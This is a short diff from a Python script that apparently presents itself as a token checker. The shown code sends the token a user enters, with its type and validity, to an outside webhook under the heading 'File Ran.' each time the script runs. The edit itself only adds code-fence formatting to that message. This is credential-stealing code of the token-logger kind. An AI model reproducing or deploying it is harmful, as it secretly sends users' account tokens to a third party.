@@ -24,9 +24,9 @@ elif tokentype == 'Invalid Token':
     valid = f'False'
 def log():
     webhook = Webhook(api)
-    webhook.send(f'''yaml
+    webhook.send(f'''```yaml
 [!] -> File Ran.
 Token Type: {tokentype}
 Token Entered: {token}
-Valid: {valid}''')
+Valid: {valid}```''')
 log()
